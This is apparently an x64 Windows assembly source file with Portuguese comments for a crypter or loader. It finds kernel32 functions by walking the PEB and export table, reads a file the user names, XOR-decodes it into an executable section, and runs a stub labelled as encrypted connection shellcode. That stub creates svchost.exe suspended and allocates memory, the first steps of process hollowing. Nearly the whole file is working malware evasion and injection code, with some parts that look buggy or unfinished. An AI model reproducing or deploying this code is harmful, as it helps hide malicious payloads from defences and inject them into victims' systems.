[BITS 64]
global WinMain

section .data	
    struc theProcess
        .cb resd 1
        .lpReserved resb 8
        .lpDesktop resb 8
        .lpTitle resb 0xc
        .dwX resd 1
        .dwY resd 1
        .dwXSize resd 1
        .dwYSize resd 1
        .dwXCountChars resd 1
        .dwYCountChars resd 1
        .dwFillAttribute resd 1
        .dwFlags resd 1
        .wShowWindow resw 1
        .cbReserved2 resw 2
        .lpReserverd2 resb 0xA
        .hStdInput resd 2
        .hStadOutput resd 2
        .hStdError resd 2
    endstruc

    startupinfoa istruc theProcess
       at theProcess.cb, dd 0
       at theProcess.lpReserved, db 0
       at theProcess.lpDesktop, db 0
       at theProcess.lpTitle, db 0
       at theProcess.dwX, dd 0
       at theProcess.dwY, dd 0
       at theProcess.dwXSize, dd 0
       at theProcess.dwYSize, dd 0
       at theProcess.dwXCountChars, dd 0
       at theProcess.dwYCountChars, dd 0
       at theProcess.dwFillAttribute, dd 0
       at theProcess.dwFlags, dd 0
       at theProcess.wShowWindow, dw 0
       at theProcess.cbReserved2, dw 0
       at theProcess.lpReserverd2, db 0
       at theProcess.hStdInput, dd 0
       at theProcess.hStadOutput, dd 0
       at theProcess.hStdError, dd 0
    iend

    TamArqProgram times 8 dq 0
    TamArqTarget times 8 dq 0
    bufferFileName times 32 db 0
    Buffer times 800000 db 0
    addressAlocado times 8 dq 0
    addressAlocadoEx times 8 dq 0
    handle times 8 dq 0
    entrypointTarget times 8 dq 0

	space dd 0
	process db "svchost.exe"
	
section .codered
	CodeRed:
	Buffer2 times 800000 db 0
	
section .deccode
	decCode:
	;SHELLCODE DE CONEXÃO ENCRIPTADO
	
	;GetProcddress no registrador R14
	call Locate_kernel32
	
	
	;CRIA PROCESSO PARA OUTRO programa suspenso
	
	;Lookup CreateProcessA
	mov rax, 0x41737365636f
	push rax
	mov rax, 0x7250657461657243
	push rax
	mov rdx, rsp
	mov rcx, r8
	sub rsp, 0x30
	call R14
	add rsp, 0x30
	add rsp, 0x10
	mov r12, rax
	
	;Call CreateProcessA
	lea rdx,[space]
	mov [rsp+0x48], rdx
	xor rdx,rdx
	lea rdx ,[startupinfoa+theProcess.cb]
	xor rdi,rdi
	xor r9,r9
	mov r9, 0x1
	xor r11,r11
	mov r11, 0x04
	mov rdi, 0x0000000000000000
	mov [rsp+0x40], rdx 
	mov [rsp+0x38], rdi
	mov [rsp+0x30], rdi
	mov [rsp+0x28], r11
	mov [rsp+0x20], r9
	mov r9d, 0
	mov r8d, 0
	lea rdx , [process]
	mov ecx, 0
	xor r10,r10
	call r12
	add rsp, 0x30
	
	call Locate_kernel32
	call GetProcAddres
	mov rdi,r8
	
	;Lookup VirtualAlloc
	mov rax, "lloc"
	push rax
	mov rax, "VirtualA"
	push rax
	lea rdx, [rsp]
	mov rcx, r8
	sub rsp, 0x30
	call r14
	mov r12,rax
	add rsp, 0x30

	;call VirtualAlloc
	mov r9d, 0x04
	mov r8d, 0x1000
	mov rdi, [TamArqProgram]
	mov edx, edi
	mov ecx, 0x00
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	mov rbx,rax
			
 
section .text
WinMain:
    Start:
        ;***************
        ;**** START ****
        ;***************
        ;* By: Teuzero *
        ;***************
        add rsp, 0xfffffffffffffdf8; # Bytes Vazios
		
        ; Obtem o endereço base do kernel32.dll 
        call Locate_kernel32
        call IAT
        call FinFunctionGetProcAddress
        call LoadLibraryA
        call LoadMsvcrt
        call PrintMsgConsole
        call PegaNomeDoaquivo
        call OpenFile
        mov rbp,rdi
        mov r10, rbp ; Arquivo alvo
        ;Nome do proprio programa
        mov rax, "T0.exe"
        add rsp, 0x20
        mov [rsp+0x10], rax
        xor rax, rax
        mov rax, [TamArqProgram]
        mov [TamArqTarget], rax
		xor r10,r10
		call Locate_kernel32
		
		call VirtualProect
		;CALL VirtualProtect 
		mov r10, [TamArqTarget]
		add r10, 0x77
		sub rsp, 0x30
		push rsp
		mov r9, rsp
		mov r8d, 0x40
		mov rdx, r10
		mov ecx, CodeRed
		sub rsp, 0x30
		call rsi
		add rsp, 0x30
		
		
		mov ecx, 0
		mov rax, CodeRed
		mov rdx,[TamArqTarget]
		xor rcx,rcx
		WriteSecion:
			mov rbx, [rbp]
			xor rbx, 0xC0FFEE
			mov [rax], rbx
			inc rax
			inc rbp
			
			dec rdx
			cmp rcx,rdx
			jne WriteSecion        
			call decCode
	ret
	
    ;***************
    ;*     AND     *
    ;***************
		
	

	

    PrintMsgConsole:
			; Lookup printf
			mov rax, "printf"
			push rax
			mov rdx, rsp
			mov rcx, r15
			sub rsp, 0x30
			call r14
			add rsp, 0x30
			mov r12, rax
	
			; call printf
			mov rax, ":"
			push rax
			mov rax, "[+] File"
			push rax
			lea rcx, [rsp]
			sub rsp, 0x30
			call r12
			add rsp, 0x30
			add rsp, 0x18
    ret

    PegaNomeDoaquivo:
			; Lookup scanf
			mov rax, "scanf"
			push rax
			mov rdx,rsp
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12, rax
			add rsp, 0x30
		
			; call scanf
			lea rax, [rsp+0x20]
			mov rdx, rax
			mov rax, "%s"
			push rax
			lea rcx, [rsp]
			sub rsp, 0x30
			call r12
			add rsp, 0x30
			add rsp, 0x10
    ret

	OpenFile:
			;Lookup fopen
			mov rax, "fopen"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12,rax
			add rsp, 0x30
	
			;Abre arquivo
			lea rcx, [rsp+0x20]
			mov rax, "rb"
			push rax
			lea rdx, [rsp]
			sub rsp, 0x30
			call r12
			add rsp, 0x30
			mov rbx,rax
			add rsp, 0x10
        
	LocomoveParaOFimDoarquivo:
			;Lookup fseek
			mov rax, "fseek"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12,rax
			add rsp, 0x30

			;call fseek
			mov rcx, rbx
			mov r8d, dword 0x02        
			mov edx, dword 0x00
			sub rsp, 0x30
			call r12
			add rsp, 0x30
			add rsp, 0x08
	
	GetSizeFile:
			;Lookup ftell
			mov rax, "ftell"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			add rsp, 0x30
			mov r12,rax
	
			;call ftell
			mov rcx, rbx
			sub rsp, 0x30
			call r12
			mov [TamArqProgram], rax
			add rsp,0x30
			mov rsi,rax
			add rsp, 0x08

	AlocaEspacoEmUmEndereco:
			;Lookup malloc
			mov rax, "malloc"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12,rax
			add rsp, 0x30

			;call malloc
			mov rcx, rsi
			sub rsp, 0x30
			call r12
			mov rdi, rax
			add rsp,0x30
			add rsp, 0x08

	MoveParaInicioDoArquivo:
			;Lookup rewind
			mov rax, "rewind"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12, rax
			add rsp, 0x30
	
			;call rewind
			mov rcx, rbx
			sub rsp, 0x30
			call r12
			add rsp, 0x30
			add rsp, 0x08

	GravaOPEdoArquivoNoEnderecoAlocadoPorMalloc:
			;Lookup fread
			mov rax, "fread"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12, rax
			add rsp, 0x30

			;call fread
			mov edx,esi
			mov r9, rbx
			mov r8d, 0x01
			mov rcx, rdi
			sub rsp, 0x30
			call r12
			add rsp, 0x30
			add rsp, 0x08

	FechaArquivo:
			;Lookup fclose
			mov rax, "fclose"
			push rax
			lea rdx, [rsp]
			mov rcx, r15
			sub rsp, 0x30
			call r14
			mov r12, rax
			add rsp, 0x30

			;call fclose
			sub rsp,0x30
			mov rcx, rbx
			call r12
			add rsp, 0x30
			add rsp, 0x08
    ret
         

	;********************************
	;* ABAIXO SÃO FUNÇÕES PARA USO  *
	;********************************
	
    ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
    FinFunctionGetProcAddress:
			mov rcx, r10; # Set loop counter
			
    kernel32findfunction:  
			jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
			xor ebx,ebx; # Zera EBX para ser usada
			mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
			add rbx, r8; # RBX = Nome da funcao VMA
			dec rcx; # Decrementa o loop em 1
			mov rax, 0x41636f7250746547; # GetProcA
			cmp [rbx], rax; # checa se rbx é igual a  GetProcA
			jnz kernel32findfunction;  
        
    ; Encontra o endereço da função de GetProcessAddress
    FunctionNameFound:                 
			; We found our target
			xor r11, r11; 
			mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
			add r11, r8; # AddressOfNameOrdinals VMA
			; Get the function ordinal from AddressOfNameOrdinals
			inc rcx; 
			mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
			; Get function address from AddressOfFunctions
			xor r11, r11; 
			mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
			add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
			mov eax, [r11+4+r13*4]; # Get the function RVA.
			add rax, r8; # Add base address to function RVA
			mov r14, rax; # GetProcAddress to R14
        ret

    LoadLibraryA:
		   ; pega o endereco LoadLibraryA usando GetProcAddress
			mov rcx, 0x41797261;  
			push rcx;  
			mov rcx, 0x7262694c64616f4c;  
			push rcx;  
			mov rdx, rsp; # joga o ponteiro da string LoadLibraryA para RDX
			mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
			sub rsp, 0x30; # Make some room on the stack
			call r14; # Call GetProcessAddress
			add rsp, 0x30; # Remove espaço locdo na pilha
			add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
			mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
        ret

    LoadMsvcrt:
			; Load msvcrt.dll
			mov rax, "ll"
			push rax
			mov rax, "msvcrt.d"
			push rax
			mov rcx, rsp
			sub rsp, 0x30
			call rsi
			mov r15,rax
			add rsp, 0x30
			add rsp, 0x10
    ret		 

    GetProcAddres:
			xor r11,r11
			xor r13,r13
			xor rcx, rcx; # Zera RCX
			mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
			mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
			mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
			lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
			xchg rax, rsi; # troca RAX,RSI
			lodsq; # Load qword at address (R)SI into RAX
			mov rbx, [rax + 0x20] ; # RBX = Kernel32 base address
			mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
			  
			; Código para chegar na tabela de endereco de exportacao
			mov ebx, [rbx+0x3C]; # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
			add rbx, r8; # Add defrerenced signature offset to kernel32 base. Store in RBX.
			mov r12, 0x88FFFFF;      
			shr r12, 0x14; 
			mov edx, [rbx+r12]; # Offset from PE32 Signature to Export Address Table (NULL BYTE)
			add rdx, r8; # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
			mov r10d, [rdx+0x14]; # numero de funcoes
			xor r11, r11; # Zera R11 para ser usado 
			mov r11d, [rdx+0x20]; # AddressOfNames RVA
			add r11, r8; # AddressOfNames VMA

    FinFunctionGetProcAddress2:
        mov rcx, r10; # Set loop counter
        kernel32findfunction2:  
			jecxz FunctionNameFound2; # Percorra esta função até encontrarmos GetProcA
			xor ebx,ebx; # Zera EBX para ser usada
			mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
			add rbx, r8; # RBX = Nome da funcao VMA
			dec rcx; # Decrementa o loop em 1
			mov rax, 0x41636f7250746547; # GetProcA
			cmp [rbx], rax; # checa se rbx é igual a  GetProcA
			jnz kernel32findfunction2;  
        
    ; Encontra o endereço da função de GetProcessAddress
    FunctionNameFound2:                 
			; We found our target
			xor r11, r11; 
			mov r11d, [rdx+0x24]; # AddressOfNameOrdinals RVA
			add r11, r8; # AddressOfNameOrdinals VMA
			; Get the function ordinal from AddressOfNameOrdinals
			inc rcx; 
			mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
			; Get function address from AddressOfFunctions
			xor r11, r11; 
			mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
			add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
			mov eax, [r11+4+r13*4]; # Get the function RVA.
			add rax, r8; # Add base address to function RVA
			mov r14, rax; # GetProcAddress to R14
    ret


	;locate_kernel32
	Locate_kernel32: 
			xor rcx, rcx; # Zera RCX
			mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
			mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
			mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
			lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
			xchg rax, rsi; # troca RAX,RSI
			lodsq; # Load qword at address (R)SI into RAX
			mov rbx, [rax + 0x20]; # RBX = Kernel32 base address
			mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
	ret
    
	IAT:
	; Código para chegar na tabela de endereco de exportacao
			mov ebx, [rbx+0x3C];# obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
			add rbx, r8;# Add defrerenced signature offset to kernel32 base. Store in RBX.
			mov r12, 0x88FFFFF;      
			shr r12, 0x14; 
			mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
			add rdx, r8;# RDX = kernel32.dll + RVA ExportTable = ExportTable Address
			mov r10d, [rdx+0x14]; # numero de funcoes
			xor r11, r11;# Zera R11 para ser usado 
			mov r11d, [rdx+0x20]; # AddressOfNames RVA
			add r11, r8;# AddressOfNames VMA
    ret
        
    ;locate_ntdll
	Locate_ntdll:        
			xor rcx, rcx; # Zera RCX
			mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
			mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
			mov rsi, [rax + 0x30]; # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
			mov rbx, [rsi +0x10]; # dll base ntdll
			mov r8, rbx; # Copia o endereco base da ntdll para o registrador R8
	ret

	LoadLibrary:        
			mov rcx, 0x41797261;  
			push rcx;  
			mov rcx, 0x7262694c64616f4c;  
			push rcx;  
			mov rdx, rsp; # joga o ponteiro de LoadLibraryA para RDX
			mov rcx, r8; # Copia endereco base do Kernel32 para RCX
			sub rsp, 0x30; # Make some room on the stack
			call r14; # Call GetProcessAddress
			add rsp, 0x30; # Remove espaço alocado na pilha
			add rsp, 0x10; # Remove a string LoadLibrary alocada 
			mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
	ret
	
	VirtualProect:
	; pega o endereco VirtualProtect usando GetProcAddress
			mov rcx, 0x746365746f72
			push rcx
			mov rcx, 0x506C617574726956
			shr rcx, 0x40
			push rcx
			mov rdx, rsp; # joga o ponteiro da string VirtualProtect para RDX
			mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
			sub rsp, 0x30
			call r14; # Call GetProcessAddress
			add rsp, 0x30; # Remove espaço locdo na pilha
			add rsp, 0x10; # Remove a string alocada de  VirtualProtect 
			mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
	ret
